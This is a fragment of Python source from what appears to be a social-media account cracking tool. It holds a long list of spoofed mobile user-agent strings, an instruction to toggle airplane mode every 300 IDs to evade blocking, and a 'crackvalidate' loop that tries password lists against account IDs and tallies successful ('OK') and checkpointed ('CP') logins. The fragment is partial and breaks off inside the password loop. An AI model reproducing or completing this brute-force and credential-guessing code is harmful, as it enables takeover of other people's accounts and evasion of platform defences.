...
def iphone():
  ...
  asep4 = f"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36"
  asep5 = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
  asep5 = f"Mozilla/5.0 (Linux; Android 14; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36"
  asep5 = f"Mozilla/5.0 (Linux; Android 13; moto g53 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36"
  asep5 = f"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G988B/G988BXXSJHXA1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36"
  asep5 = f"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36 EdgA/113.0.1774.63"
  asep5 = f"Mozilla/5.0 (Linux; Android 11; motorola one vision) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36"
  asep5 = f"Mozilla/5.0 (Linux; Android 14; SC-51D) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36"
  asep5 = f"Mozilla/5.0 (Linux; Android 14; SAMSUNG SM-S918B/S918BXXS3BXAD) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36"
  asep5 = f"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A515F/A515FXXU8HWI1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36"
  asep5 = f"Mozilla/5.0 (Linux; Android 5.1.1; KFSUWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/108.4.6 like Chrome/108.0.5359.220 Safari/537.36"
  asep5 = f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Safari/537.36"
  asep5 = f"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A700K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36"
...
def passwordlist():
	global prog,des
	print(f'{puti}') 
	print(f'{bira}└─ ➢{kun}𝙼𝚘𝚍𝚎 𝚙𝚎𝚜𝚊𝚠𝚊𝚝 𝚜𝚎𝚝𝚒𝚊𝚙 {hijo} 300 {kun}𝙸𝚍 ')
	print(f'{puti}') 
...
def crackvalidate(idf,pwx,url):
	...
	rc = random.choice
	emot = rc(["🥸",])
	prog.update(des,description=f"\r[bold green]EGI[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des)
	for pw in pwx:
		try:
